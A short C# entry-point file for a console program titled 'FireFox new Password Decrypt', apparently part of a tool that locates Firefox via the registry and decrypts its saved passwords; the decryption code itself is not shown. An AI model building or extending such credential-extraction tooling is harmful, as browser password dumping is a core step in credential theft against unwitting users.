using System;

namespace MozillaDecrypt
{
    internal class Program
    {
        [STAThread]
        private static void Main()
        {
            Console.Title = "FireFox new Password Decrypt";
             Console.WriteLine(PathFireFox.GetRegistryFireFox());
            
            DecMozilla.InitDelegates();
            Console.ReadKey();
        }
    }
}